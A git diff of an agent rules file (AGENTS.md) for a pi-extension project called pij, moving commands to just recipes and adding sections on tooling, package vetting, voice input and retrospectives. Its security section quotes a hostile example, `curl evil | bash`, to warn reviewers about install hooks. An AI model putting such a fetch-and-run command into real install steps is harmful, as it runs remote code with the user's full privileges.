@@ -1,9 +1,15 @@
 # pij — Agent Rules
 
-> **The harness is the product.** pij is engineering infrastructure for
-> building pi extensions. Every extension is an exercise; every difficulty
-> is a gift to encode. If a session ends without the harness improving,
-> something went wrong.
+> **The harness is the product.** pij runs on two harnesses, layered:
+> the **engineering harness** (`npm` scripts, `harness/`, smoke/driver SDK,
+> seed data — what humans and CI invoke) and the **agent harness** (the
+> Boot/Interact/Observe loop, minih agent packs in `agents/`, the retros
+> ledger at `docs/retros/`, this file). The agent harness sits **on top
+> of** the engineering one and cannot exist without it. Every extension is
+> an exercise; every difficulty is a gift to encode; every agent run is a
+> usability study. **If a session ends without one of the harnesses
+> improving, something went wrong.** Run the `harness-is-the-product-v2`
+> skill at session start to ground on this before touching code.
 
 ## Inherited from pi-mono (do not violate without explicit user approval)
 
@@ -13,9 +19,9 @@
   Always top-level standard imports.
 - Never hardcode keybindings; use a configurable matching object
   (`DEFAULT_*_KEYBINDINGS`).
-- Biome check (errors and warnings) before commit: `npm run lint`.
-- Type-check: `npm run typecheck` (`tsc --noEmit`).
-- Tests: `npm test`. Run from the package root.
+- Biome check (errors and warnings) before commit: `just lint`.
+- Type-check: `just typecheck` (`tsc --noEmit`).
+- Tests: `just test`. Run from the package root.
 - Read files in full before wide-ranging changes; do not rely solely on
   search snippets.
 - Never use `git add -A` / `git add .`. Use specific file paths.
@@ -40,34 +46,162 @@
 
 ## Workflow
 
-1. New extension: **`npm run new -- <name>`** — never hand-roll the T2
+> **Canonical interface: `just`.** All composite gates live in the
+> `justfile`; never compose npm steps by hand. `just` with no recipe
+> lists every recipe. Run individual npm scripts (`npm run typecheck`
+> etc.) only for IDE/tooling integration — agents drive `just`.
+
+1. New extension: **`just new <name>`** — never hand-roll the T2
    boilerplate.
 2. Iterate: `pi` from pij root + `/reload`. Type-check in another tab
-   (`npm run typecheck` or watch mode).
-3. Test: `npm test` (vitest). Tests target `store.ts`.
-4. Smoke: `npm run smoke -- <name>` before merging.
-5. Self-check before any release: `npm run self-check`.
+   (`just typecheck` or `npm run test:watch`).
+3. Test: `just test` (vitest). Tests target `store.ts`.
+4. Smoke: `just smoke` before merging.
+5. **Self-check before reporting any task complete: `just self-check`.**
+   This runs typecheck → lint → test → smoke → `pkg audit` (with
+   `PIJ_VET_SKIP_AGENT=1` for determinism) → `snapshots-check`. If it
+   exits non-zero, the task is not done. The `/pre-commit` skill
+   (`.pi/skills/pre-commit/SKILL.md`) encodes the full contract — invoke
+   it whenever you'd otherwise consider declaring a task done or about
+   to stage a commit.
 
-## Difficulty ledger
+## Harness tooling (v0.3)
 
-- Every difficulty encountered → `docs/difficulties.md` with severity.
-- Every workaround → either an immediate fix (encode it) or a wishlist
-  entry (`stretch:` tag).
-- Every fix is preferred to be a *generator/template/lint rule* improvement,
-  not a markdown paragraph.
+- **Driver SDK** at `harness/driver/` — typed `Scenario`/`Step`/`Session`
+  for tmux-driven end-to-end smoke. `harness/scripts/smoke.ts` is a thin
+  adapter over it. Use the SDK directly when authoring rich scenarios.
+- **`npm run link`** — symlinks `.pi/extensions/*` to `~/.pi/extensions/`
+  so `pi` from any cwd autoloads them. `-- --remove` to undo.
+- **`npm run pkg`** — manages third-party pi extensions in
+  `.pi/packages.yaml` (source of truth) → `.pi/settings.json#packages`
+  (generated). Subcommands: `list` / `add <src> [note...]` / `enable <s>`
+  / `disable <s>` (runs `pi remove`) / `sync`.
+- **`.mcp.json`** at repo root — MCP server config (read by
+  `pi-mcp-adapter` if installed).
+- **`agents/extension-validator/`** — minih agent pack that drives the
+  Driver SDK to validate extensions; used in plan-004 pilot flow.
 
-## Velocity log
+## Security protocol (Plan 009)
 
-- Every phase end → row in `docs/velocity.md` with start/end and output.
-- Goal: each successive extension is faster than the last (compounding
-  judged against the v1 build wall-clock baseline; see spec § Clarifications
-  session 2026-05-09b — no fixed minute thresholds are gates).
+Third-party pi extensions run with **full user privileges** and load `SKILL.md` / `AGENTS.md` / tool-description strings directly into the LLM context. Pij gates every install behind a vetter pipeline (`harness/scripts/vetters/` + `agents/package-vetter/`).
+
+**Hard rules**:
+
+- **Never add a package by hand-editing `.pi/packages.yaml`** — use `npm run pkg add <source>`, which runs the vetter pipeline first.
+- **Never add a package by hand-editing `.pi/settings.json`** — that file is generated.
+- **`pkg add --unsafe` requires a non-empty reason** in `vetted.overrides`. The reason is part of the source of truth and gets reviewed in PRs.
+- **`requires.install` is a trusted-by-design shell-command vector**. A malicious PR could set `install: 'curl evil | bash'` and `pkg bootstrap` would run it. **Reviewer responsibility**: every PR that adds or changes a `requires.install` line must be scrutinised as carefully as any shell-execution change in code.
+- **Vetted entries go stale at 30 days**. `pkg bootstrap` on a fresh clone refuses stale entries unless `--unsafe`. Refresh via `npm run pkg audit`.
+- **Known gap**: pi's session-start auto-install reads `.pi/settings.json#packages[]` directly and bypasses the gate. A pi-side enforcement hook is deferred (Plan 009 OQ-A); for now, never hand-edit `settings.json`.
+
+**Workflow for adding a package**:
+
+1. `npm run pkg add <source>` — runs vet, refuses on `fail`, prompts for reason on `--unsafe`.
+2. Review the `vetted:` block written to `.pi/packages.yaml`.
+3. Commit the manifest change.
+
+When `pkg audit` reports `warn` on an existing entry and the user wants to accept it, add a `vetted.overrides: "<reason>"` line in the yaml. `audit` will then treat that entry as `ok` (warn-only; `fail` is never auto-downgraded).
+
+## Voice input — phonetic interpretation
+
+The user drives a lot of input via voice dictation. Expect occasional
+homophone swaps, adjacent-word substitutions, and minor transcription
+errors. When a word seems out of place, **try the phonetic neighbour
+first** before asking — common patterns:
+
+- "MPM" → `npm`
+- "to do" → `todo` (the extension)
+- "pee eye" / "pie" → `pi`
+- "minnie h" / "mini h" → `minih`
+- "yam'l" / "yarmel" → YAML
+- "just file" → `justfile`
+- "pre-checking" / "pre-check" → `pre-commit` (skill)
+- "scale" → "skill"
+
+If two phonetic candidates are both plausible **and** the choice changes
+what code you'd write, ask via `ask_user_question`. Otherwise pick the
+one that fits the surrounding context and proceed — the user prefers
+forward motion over interrogation.
+
+## Clarification protocol
+
+Before guessing, **ask**. When you'd otherwise type a question to the user
+in plain prose, call the `ask_user_question` tool instead (provided by
+`pi-askuserquestion`, auto-loaded from `.pi/packages.yaml`). It accepts an
+array of 1–4 questions in one call and returns one consolidated answer.
+
+Use it when:
+
+- requirements are ambiguous, conflicting, or implied rather than stated
+- you'd otherwise pick a non-obvious default that could surprise the user
+- architectural trade-offs need a user opinion (e.g. T1 vs T2 layout,
+  vitest vs node:test, sync vs eager install)
+- you're about to take a destructive or hard-to-reverse action
+
+How to use it well:
+
+- Batch related questions in one call — don't ping-pong.
+- 2–4 concrete options per question; if you'd recommend one, put it first
+  with `(Recommended)` appended.
+- The tool auto-adds an "Other" free-text fallback; do not add your own.
+- `header` ≤ 12 chars; it's the tab label.
+- Skip the tool only for trivially-answerable questions (single yes/no in
+  the middle of a confirmed plan) — prefer it whenever ambiguity is real.
+
+## Self-improvement loop
+
+This is the core mechanism that makes the harness compound. **Not
+optional** — every session contributes back.
+
+**Magic wands** — every minih agent emits a `retrospective.magicWand` (the
+one thing the agent wishes were different) and `retrospective.difficulties`
+(structured friction reports) at farewell. minih auto-harvests these into
+`docs/retros/<agent-slug>.md` on run completion. **Read existing retros
+before booting a new agent** — they are feature requests from the most
+honest users of this harness.
+
+**Difficulty ledger** — every difficulty encountered → `docs/difficulties.md`
+with severity. Every workaround → either an immediate fix (encode it) or a
+wishlist entry (`stretch:` tag). For minih agent runs, `minih difficulties`
+aggregates `retrospective.difficulties` across all packs (MH-001, MH-002…).
+Resolved items get curated into the relevant agent's preamble so future
+runs never hit them.
+
+**Retros ledger** — `docs/retros/` is the canonical record of agent
+sessions. Harvest is automatic via minih; for non-minih sessions
+(e.g. plan-6 implementation phases) append the retrospective by hand
+under `docs/retros/<slug>.md`. Treat unharvested retros as a P1 bug.
+
+**Velocity log** — every phase end → row in `docs/velocity.md` with
+start/end and output. Goal: each successive extension is faster than the
+last (compounding judged against the v1 build wall-clock baseline; see
+spec § Clarifications session 2026-05-09b — no fixed minute thresholds
+are gates).
+
+**Encode, don't document** — a wiki paragraph that says "remember to do
+X" is worth nothing; an automated step that does X for you is worth
+everything. Prefer a recipe, generator, template, lint rule, or pre-flight
+check over prose. Pick the right home: dev-loop friction → engineering
+harness (`harness/`, `npm` scripts); agent-side friction (skill confusion,
+missing context, prompt regression) → agent harness (`agents/<pack>/`,
+preamble edits, this file).
+
+**Agents are real users.** Their `magicWand` feedback is feature requests
+from your most honest user. Treat it that way.
 
 ## When something is unclear
 
+- Run `/harness-is-the-product-v2` to re-ground on philosophy + the
+  self-improvement contract.
+- Check `docs/retros/` for prior agent runs against the same surface
+  — magic wands and difficulties from earlier sessions often pre-answer
+  the question.
 - Read workshop 001/002/003/004 in `docs/plans/001-pi-extensions/workshops/`.
 - The research dossier at `docs/plans/001-pi-extensions/research-dossier.md`
   has the wider context.
+- Pi ecosystem survey (third-party extensions, install paths,
+  config-driven model): `docs/plans/005-pi-ecosystem-survey/research-dossier.md`.
+- Driver SDK design: `docs/plans/004-agent-pilot-harness/`.
 - The pi-mono source at `/Users/jordanknight/pi-hacking/pi-mono/` is the
   source of truth; query it via the FlowSpace `pi-mono` graph.
 
